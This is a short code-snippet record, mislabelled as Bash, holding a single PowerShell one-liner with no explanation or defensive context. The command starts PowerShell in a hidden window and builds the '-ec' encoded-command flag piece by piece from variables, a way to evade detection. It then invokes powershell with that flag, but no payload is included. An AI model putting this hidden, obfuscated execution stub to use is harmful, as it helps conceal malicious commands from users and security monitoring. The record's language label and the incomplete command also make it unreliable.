---
id: d7c3b773-d39b-476b-9980-6f539d6de7d0
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:10.829147+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet d7c3b773

**Language**: Bash

```bash

powershell -window hidden -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() "

```
